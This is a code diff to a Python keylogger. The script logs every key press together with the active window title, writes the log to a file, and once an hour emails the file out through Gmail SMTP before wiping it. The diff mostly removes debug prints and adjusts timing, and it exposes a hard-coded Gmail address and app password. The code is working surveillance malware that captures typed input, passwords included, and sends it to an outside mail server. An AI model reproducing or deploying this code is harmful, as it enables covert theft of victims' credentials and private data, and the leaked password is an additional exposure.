@@ -22,20 +22,19 @@ class FileManipulator:
 
             global send_overwrite
             while send_overwrite != 1:
-                time.sleep(0.5)
+                time.sleep(0.2)
                 #try block to handle empty block
                 try:
                     #get the fifo logg
                     logg = PyLoggs.keyQueue.get_nowait()
                     f.write(f'{logg} ~ {datetime.now()}\n')
-                    print(logg)
                 except queue.Empty as e:
-                    print(f"Queue is empty test successful: {e}")
+                    time.sleep(0.001)
 
-            print("closing temporarily queue")
             f.close()
 
 
+    #crafting the email message to send
     @classmethod
     def make_message(cls, content):
         msg = EmailMessage()
@@ -48,39 +47,26 @@ class FileManipulator:
 
     @staticmethod
     def send_overwrite():
-        print("TIMER METHOD WAITING TO OVERWRITE")
         with f_lock:
-            print("timer entered send overwrite block")
-
             #resetting var so writer can continue
             global send_overwrite
             send_overwrite = 0
 
-            #sending that email
-            print("sending email")
-            #creating a session
-            print("getting session")
+            #getting session with google
             s = smtplib.SMTP('smtp.gmail.com', 587)
             #starting tls
-            print("starting tls")
             s.starttls()
             # Authentication
-            print("auth to fuckface")
             s.login("krunkhehehaha@gmail.com", "doii tpmd gytk vomo")
             #dumping file to message string
-            print("dumping file")
             f = open("demofile.txt")
             message = FileManipulator.make_message(f.read())
             f.close()
             #send the mail
-            print("yeet mail")
-            print(f'message -> {message}')
-            s.sendmail("krunkhehehaha@gmail.com", "krunkhehehaha@gmail.com", message.as_string())
+            s.sendmail(message["From"], message["To"], message.as_string())
 
             f = open("demofile.txt", "w")
-            print("overwrote file")
             f.write("")
-            print("wrote empty string and closing now")
             f.close()
 
 
@@ -90,12 +76,10 @@ class TheWriter:
     @staticmethod
     def write_to_file():
         FileManipulator.write_queue()
-        ###while loop to check signal on lock to reenter
+        ###while loop to reenter
         while True:
-            global send_overwrite
-            if send_overwrite != 1:
-                print("waiting to reenter queue write")
-                FileManipulator.write_queue()
+            time.sleep(0.5)
+            FileManipulator.write_queue()
 
 
 
@@ -120,9 +104,6 @@ class PyLoggs:
 
     @classmethod
     def on_release(cls, key, injected):
-        #setting global variable to overwrite
-        global send_overwrite
-        send_overwrite = 1
         #add release to queue
         key_release = '{} rels : {} : Window {}'.format(
             key, 'faked' if injected else 'not faked', gitwin.getActiveWindowTitle())
@@ -144,16 +125,16 @@ class PyLoggs:
             time.sleep(60)
 
 
+
 class timer:
     #this will call the method to overwrite and send
     #the queue dumper should see the lock exited as its waiting to reenter
     @staticmethod
-    @schedule.repeat(schedule.every().hour.at(":00"))
+    @schedule.repeat(schedule.every().hour.at(":27"))
     def send_overwrite():
         global send_overwrite
         send_overwrite = 1
         FileManipulator.send_overwrite()
-
 
 
     @classmethod
@@ -171,12 +152,12 @@ def main():
     f = open("demofile.txt", "w")
     f.close()
 
-    #daeomonized thread will exit when all other non-daemons exit
-    t_timer = threading.Thread(target=timer.run_my_scedule, daemon=True, args=()).start()
     #declaring and defining the logging thread
     t_loggs = threading.Thread(target=PyLoggs.board_listen, args=())
-    #daeomonized thread will exit when all other non-daemons exit
+    #the writer thread 
     t_writer = threading.Thread(target=TheWriter.write_to_file, daemon=True, args=()).start()
+    #the timer send/overwrite thread
+    t_timer = threading.Thread(target=timer.run_my_scedule, daemon=True, args=()).start()
     #starting the main logging thread
     t_loggs.start()
     t_loggs.join()
